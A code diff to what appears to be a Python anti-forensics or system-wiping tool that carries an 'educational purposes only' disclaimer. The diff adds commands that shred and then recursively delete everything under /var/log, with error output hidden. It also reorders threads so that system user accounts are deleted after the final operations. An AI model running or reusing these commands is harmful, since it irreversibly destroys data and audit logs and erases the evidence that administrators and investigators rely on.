@@ -2,12 +2,12 @@
 # Emre Ovunc
 # info@emreovunc.com
 
-# I am not to be liable for direct, 
-# indirect or consequential damages or 
-# for any loss of revenue, profits or 
-# data arising in connection with using 
-# this tool, including, but not limited to, 
-# medical, physical and psychological effects. 
+# I am not to be liable for direct,
+# indirect or consequential damages or
+# for any loss of revenue, profits or
+# data arising in connection with using
+# this tool, including, but not limited to,
+# medical, physical and psychological effects.
 # It is intended for educational purposes only.
 
 from os import walk
@@ -150,6 +150,9 @@ def remove_swap():
     except:
         pass
 
+    system('shred -zu /var/log/* 2>/dev/null')
+    system('rm -rf /var/log 2>/dev/null')
+
 
 def user_operations():
     for root, dirs, files in walk("/home/" + account_name):
@@ -205,19 +208,19 @@ def main():
     user_desktop_t1.start()
     user_operation_t2.start()
     log_t4.start()
-    del_users_t5.start()
 
     swap_t1.join()
     bash_t2.join()
     user_desktop_t1.join()
     user_operation_t2.join()
     log_t4.join()
-    del_users_t5.join()
 
     try:
         last_operations()
     except:
         pass
+
+    del_users_t5.start()
 
     disk_operations()
 
